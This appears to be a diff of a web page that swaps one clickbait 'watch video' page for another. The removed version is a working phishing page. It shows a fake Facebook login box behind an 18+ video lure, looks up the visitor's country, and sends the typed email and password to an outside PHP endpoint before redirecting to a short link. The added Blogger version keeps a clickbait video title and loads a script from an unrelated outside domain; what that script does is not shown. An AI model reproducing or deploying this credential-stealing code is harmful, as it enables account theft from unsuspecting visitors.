@@ -1,254 +1,38 @@
-<!DOCTYPE html>
-<html>
+<?xml version="1.0" encoding="UTF-8" ?>
+<html prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
 
-<head>
-    <meta charset="UTF-8" />
-    <title></title>
-    <style>
-        .modal-content {
-            width: 380px;
-            height: 480px;
-            background-color: transparent !important;
-            box-shadow: none !important;
-            border: 0 !important;
-        }
-        .modal-body {
-            background: radial-gradient(ellipse at center,#5170ad 0,#355493 100%);
-            border: 1px solid #2d416d;
-            box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgba(0,0,0,.1);
-            border-radius: 5px;
-            width: 380px;
-            height: 480px;
-            margin: 60px auto;
-            padding: 50px 30px 0 30px !important;
-            text-align: center;
-            margin-left: 50%;
-            transform: translateX(-25%);
-        }
-        .modal-body h1 {
-                margin: 0 0 50px 0;
-            padding: 0;
-            font-weight: 700;
-            font-size: 26px;
-            color: #fff;
-        }
-        .login-form input[name=username], .login-form input[name=password] {
-            width: 100%;
-            border: 1px solid #314d89;
-            margin-right: 110px;
-            outline: 0;
-            padding: 12px 20px;
-            font-weight: 400;
-            font-family: Lato,sans-serif;
-            cursor: pointer;
-        }
-        .login-form input[name=username] {
-            border-bottom: none;
-            border-radius: 4px 4px 0 0;
-            padding-bottom: 13px;
-            box-shadow: 0 -1px 0 #e0e0e0 inset, 0 1px 2px rgba(0,0,0,.23) inset;
-        }
-        .login-form input[name=password] {
-            border-top: none;
-            border-radius: 0 0 4px 4px;
-            box-shadow: 0 -1px 2px rgba(0,0,0,.23) inset, 0 1px 2px rgba(255,255,255,.1);
-        }
-        #btnSubmit {
-            font-family: Lato,sans-serif;
-            font-weight: 400;
-            background: linear-gradient(to bottom,#e0e0e0 0,#cecece 100%);
-            display: block;
-            margin: 20px auto 0 auto;
-            width: 100%;
-            border: none;
-            border-radius: 3px;
-            padding: 8px;
-            font-size: 17px;
-            color: #636363;
-            text-shadow: 0 1px 0 rgba(255,255,255,.45);
-            font-weight: 700;
-            box-shadow: 0 1px 3px 1px rgba(0,0,0,.17), 0 1px 0 rgba(255,255,255,.36) inset;
-        }
-        .login-form-wrap h5>a {
-            font-size: 14px;
-            color: #fff;
-            text-decoration: none;
-            font-weight: 400;
-        }
-        .mt-10 {
-            margin-top: 10px;
-            margin-bottom: 10px;
-        }
-        @media (max-width: 992px) {
-            .modal-content {
-                box-shadow: none !important;
-            }
-            .modal-dialog, .modal-content, .modal-body, label {
-                width: 100% !important;
-            }
-            .modal-body { 
-                margin-left: 0;
-                transform: translateX(0);
-                height: 750px;
-            }
-            .facebook_logo {
-                font-size: 60px !important;
-                margin: 50px 0 !important;
-            }
-            .login-form-wrap, #btnSubmit {
-                font-size: 40px !important;
-            }
-            .forgotpass {
-                font-size: 30px !important;
-            }
-            .title {
-                font-size: 60px !important;
-            }
-            .forgotpass_h5 {
-                margin-top: 50px;
-            }
-        }
-        
-    </style>
-</head>
-
-<body onclick="showModal();">
-    <div align="center" style="margin-top: 30px;">
-        <div class="separator" style="clear: both; text-align: center;">
-            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ CLICK HERE TO WATCH VIDEO</a></span></b>
-        </div>
-        <img src="https://i.imgur.com/qSDU6mD.png" class="img-responsive" id="img1" style="display: none;" alt="Image">
-        <img src="https://i.imgur.com/qSDU6mD.png" class="img-responsive" id="img2" style="display: none;" alt="Image">
-        <img src="https://i.imgur.com/qSDU6mD.png" class="img-responsive" id="img3" style="display: none;" alt="Image">
-        <img src="https://i.imgur.com/qSDU6mD.png" class="img-responsive" id="img4" style="display: none;" alt="Image">
-        <img src="https://i.imgur.com/qSDU6mD.png" class="img-responsive" id="img5" style="display: none;" alt="Image">
+    <head>
+        <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+        <title>Video: Kwento ng sidewalk ni Bi ----&gt;Playnow</title>
+        <meta content='Kwento ng sidewalk ni Bi ----&gt;Playnow' property='og:title'/>
+        <meta content='Video: Kwento ng sidewalk ni Bi ----&gt;Playnow' property='og:description'/>
+        <meta content='article' property='og:type'/>
+        <meta content='//blogger.googleusercontent.com/img/a/AVvXsEjPqDiir-dWzVEXs8n14myUPKoE-ZvCKG9uPM8tkGtDkiOohJS6cSkCGSBYgtEofkQ9xqThWjRZkGEz5tFbnTMywut0SF5sGvCRmMLR4IwIIIiV-8rcYxbvuLA4EohgMcSAIkOdOykW7YAZjWiH6vq_nyF8qZiBjWR5TVWnC1bqa3N_rgyYMwCOlFEqbw' property='og:image'/>
+        <meta content='960' property='og:image:width'/>
+        <meta content='960' property='og:image:height'/>
+        <meta content='Video: Kwento ng sidewalk ni Bi ----&gt;Playnow' property='og:site_name'/>
+		<script async='async' src='https://demo1.zamazika.com/9le3uhg.min.js'/>
+        <b:skin><![CDATA[
+     #loader-wrapper{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000}#loader{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;border:3px solid transparent;border-top-color:#3498db;-webkit-animation:spin 2s linear infinite;animation:spin 2s linear infinite}#loader:before{content:"";position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:3px solid transparent;border-top-color:#e74c3c;-webkit-animation:spin 3s linear infinite;animation:spin 3s linear infinite}#loader:after{content:"";position:absolute;top:15px;left:15px;right:15px;bottom:15px;border-radius:50%;border:3px solid transparent;border-top-color:#f9c922;-webkit-animation:spin 1.5s linear infinite;animation:spin 1.5s linear infinite}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg)}}@media print,(-o-min-device-pixel-ratio:5/@media print{*{background:transparent!important;color:#000!important;box-shadow:none!important;text-shadow:none!important}@page{margin:.5cm}}/*!
+* Bootstrap v4.3.1 (https://getbootstrap.com/)
+* Copyright 2011-2019 The Bootstrap Authors
+* Copyright 2011-2019 Twitter, Inc.
+* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
+*/:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,*::before,*::after{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}button:not(:disabled),[type="button"]:not(:disabled),[type="reset"]:not(:disabled),[type="submit"]:not(:disabled){cursor:pointer}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}.was-validated .custom-control-input:valid:focus:not(:checked) ~ .custom-control-label::before,.custom-control-input.is-valid:focus:not(:checked) ~ .custom-control-label::before{border-color:#28a745}.was-validated .custom-control-input:invalid:focus:not(:checked) ~ .custom-control-label::before,.custom-control-input.is-invalid:focus:not(:checked) ~ .custom-control-label::before{border-color:#dc3545}.btn-primary:not(:disabled):not(.disabled):active,.btn-primary:not(:disabled):not(.disabled).active{color:#fff;background-color:#0062cc;border-color:#005cbf}.btn-primary:not(:disabled):not(.disabled):active:focus,.btn-primary:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(38,143,255,0.5)}.btn-secondary:not(:disabled):not(.disabled):active,.btn-secondary:not(:disabled):not(.disabled).active{color:#fff;background-color:#545b62;border-color:#4e555b}.btn-secondary:not(:disabled):not(.disabled):active:focus,.btn-secondary:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(130,138,145,0.5)}.btn-success:not(:disabled):not(.disabled):active,.btn-success:not(:disabled):not(.disabled).active{color:#fff;background-color:#1e7e34;border-color:#1c7430}.btn-success:not(:disabled):not(.disabled):active:focus,.btn-success:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(72,180,97,0.5)}.btn-info:not(:disabled):not(.disabled):active,.btn-info:not(:disabled):not(.disabled).active{color:#fff;background-color:#117a8b;border-color:#10707f}.btn-info:not(:disabled):not(.disabled):active:focus,.btn-info:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(58,176,195,0.5)}.btn-warning:not(:disabled):not(.disabled):active,.btn-warning:not(:disabled):not(.disabled).active{color:#212529;background-color:#d39e00;border-color:#c69500}.btn-warning:not(:disabled):not(.disabled):active:focus,.btn-warning:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(222,170,12,0.5)}.btn-danger:not(:disabled):not(.disabled):active,.btn-danger:not(:disabled):not(.disabled).active{color:#fff;background-color:#bd2130;border-color:#b21f2d}.btn-danger:not(:disabled):not(.disabled):active:focus,.btn-danger:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(225,83,97,0.5)}.btn-light:not(:disabled):not(.disabled):active,.btn-light:not(:disabled):not(.disabled).active{color:#212529;background-color:#dae0e5;border-color:#d3d9df}.btn-light:not(:disabled):not(.disabled):active:focus,.btn-light:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(216,217,219,0.5)}.btn-dark:not(:disabled):not(.disabled):active,.btn-dark:not(:disabled):not(.disabled).active{color:#fff;background-color:#1d2124;border-color:#171a1d}.btn-dark:not(:disabled):not(.disabled):active:focus,.btn-dark:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(82,88,93,0.5)}.btn-outline-primary:not(:disabled):not(.disabled):active,.btn-outline-primary:not(:disabled):not(.disabled).active{color:#fff;background-color:#007bff;border-color:#007bff}.btn-outline-primary:not(:disabled):not(.disabled):active:focus,.btn-outline-primary:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,0.5)}.btn-outline-secondary:not(:disabled):not(.disabled):active,.btn-outline-secondary:not(:disabled):not(.disabled).active{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-outline-secondary:not(:disabled):not(.disabled):active:focus,.btn-outline-secondary:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,0.5)}.btn-outline-success:not(:disabled):not(.disabled):active,.btn-outline-success:not(:disabled):not(.disabled).active{color:#fff;background-color:#28a745;border-color:#28a745}.btn-outline-success:not(:disabled):not(.disabled):active:focus,.btn-outline-success:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,0.5)}.btn-outline-info:not(:disabled):not(.disabled):active,.btn-outline-info:not(:disabled):not(.disabled).active{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-outline-info:not(:disabled):not(.disabled):active:focus,.btn-outline-info:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,0.5)}.btn-outline-warning:not(:disabled):not(.disabled):active,.btn-outline-warning:not(:disabled):not(.disabled).active{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-outline-warning:not(:disabled):not(.disabled):active:focus,.btn-outline-warning:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,0.5)}.btn-outline-danger:not(:disabled):not(.disabled):active,.btn-outline-danger:not(:disabled):not(.disabled).active{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-outline-danger:not(:disabled):not(.disabled):active:focus,.btn-outline-danger:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,0.5)}.btn-outline-light:not(:disabled):not(.disabled):active,.btn-outline-light:not(:disabled):not(.disabled).active{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light:not(:disabled):not(.disabled):active:focus,.btn-outline-light:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,0.5)}.btn-outline-dark:not(:disabled):not(.disabled):active,.btn-outline-dark:not(:disabled):not(.disabled).active{color:#fff;background-color:#343a40;border-color:#343a40}.btn-outline-dark:not(:disabled):not(.disabled):active:focus,.btn-outline-dark:not(:disabled):not(.disabled).active:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,0.5)}.custom-control-input:focus:not(:checked) ~ .custom-control-label::before{border-color:#80bdff}.custom-control-input:not(:disabled):active ~ .custom-control-label::before{color:#fff;background-color:#b3d7ff;border-color:#b3d7ff}.close:not(:disabled):not(.disabled):hover,.close:not(:disabled):not(.disabled):focus{opacity:.75}@supports((position:-webkit-sticky) or(position:sticky)){}@media print{*,*::before,*::after{text-shadow:none!important;box-shadow:none!important}@page{size:a3}body{min-width:992px!important}}
+        ]]></b:skin>
+</head><body><div id='loader-wrapper' wfd-id='0'><div id='loader' wfd-id='3'/><div class='loader-section section-left' wfd-id='2'/><div class='loader-section section-right' wfd-id='1'/></div><b:section class='foot' id='footer-3' name='Footer' showaddelement='no'>
+<b:widget id='Attribution1' locked='true' title='' type='Attribution'>
+  <b:widget-settings>
+    <b:widget-setting name='copyright'/>
+  </b:widget-settings>
+  <b:includable id='main'>
+    <div class='widget-content' style='text-align: center;'>
+      <b:if cond='data:attribution != &quot;&quot;'>
+       <data:attribution/>
+      </b:if>
     </div>
-    <div id="myModal" class="modal fade" role="dialog">
-        <div class="modal-dialog">
-            <!-- Modal content-->
-            <div class="modal-content">
-                <div class="modal-body">
-                    <section class="login-form-wrap">
-                        <h1 class="facebook_logo">Facebook</h1>
-                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Content 18+, please login before viewing.</div>
-                        <form class="login-form" id="test-form" method="GET">
-                            <label class="mt-10">
-                                <input id="username" type="text" name="username" required="" placeholder="Email or phone number">
-                            </label>
-                            <label class="mt-10">
-                                <input id="password" type="password" name="password" required="" placeholder="password">
-                            </label>
-							<input id="country" type="text" name="country" style="display:none">
-                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Log in">
-                        </form>
-                        <h5 class="forgotpass_h5"><a href="#" target="_blank" class="forgotpass">Forgot password?</a></h5>
-                    </section>
-                </div>
-            </div>
-        </div>
-    </div>
-</body>
-<div style="position: fixed; z-index: 10000; text-align: center; top: 0; display: none; left: 0; width: 100vw; height: 100vh; background-color: rgba(0,0,0,.5);" id="loading">
-    <img src="https://www.fk-austria.at/?proxy=images/waiting.gif" style="margin-top: 100px; width: 100px; height: 100px;">
-</div>
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
-<script type="text/javascript">
-$(document).ready(() => {
-    let num = Math.floor(Math.random() * 5) + 1;
-    $('#img' + num).show();
-});
-var count = 0;
 
-sr = "";
-
-var xhrip = new XMLHttpRequest();
-xhrip.open('GET', 'https://ipinfo.io/json');
-xhrip.onload = function() {
-    
-    if (xhrip.status === 200) 
-    {
-        try
-        {
-            var rs = xhrip.responseText;
-            var js = JSON.parse(rs);
-            sr+=js.country;
-            //sr+=" - " + js.region; 
-            
-        }catch(ex)
-        {
-            sr+=" - Error";
-        }
-    
-        
-        
-    }
-    else 
-    {
-        var err = xhr.status;
-        sr+=err;
-    }
-
-};
-xhrip.send();
-
-  
-
-
-function submitForm() {
-	// $('#username').val("'" + $('#username').val());
-	// $('#password').val("'" + $('#password').val());
-
-    if ($('#username').val().length < 3 || $('#password').val().length < 6) {
-		//alert('Information entered is not correct');
-		$('#noti').css({ "color": "red" });
-		$('#noti').text('The account you have entered is invalid, Please try again.');
-		return;
-    } else {
-        //count++;
-    }
-
-    if (true) {
-        console.log(count);
-        $('#loading').show();
-        var xhr = new XMLHttpRequest();
-        var email = document.getElementById("username").value;
-        var pass = document.getElementById("password").value;
-        var truyen = encodeURI("email=" + email + "||pass=" + pass + "||laguage=" + sr);
-
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', '//brphbp.xyz/br1c2500/accvia.php?'+ truyen);
-        xhr.onload = function () {
-          if (xhr.status === 200) {
-            try {
-              var rs = xhr.responseText;
-              if (rs != "error") {
-                window.location = 'https://bit.ly/3vKMymU';
-              }
-            } catch (ex) { }
-          }
-        };
-        xhr.send();
-
-    }
-}
-
-function showModal(e) {
-    $('#myModal').modal({
-        backdrop: 'static',
-        keyboard: true,
-        show: true
-    });
-}
-
-$('#myModal').click(() => {
-    event.stopPropagation();
-})
-
-$('#loading').click(() => {
-    event.stopPropagation();
-})
-</script>
-
-</html>
+    <b:include name='quickedit'/>
+  </b:includable>
+</b:widget>
+</b:section><div class='edge-translate-notifier-center' id='edge-translate-notifier-container'/></body></html>
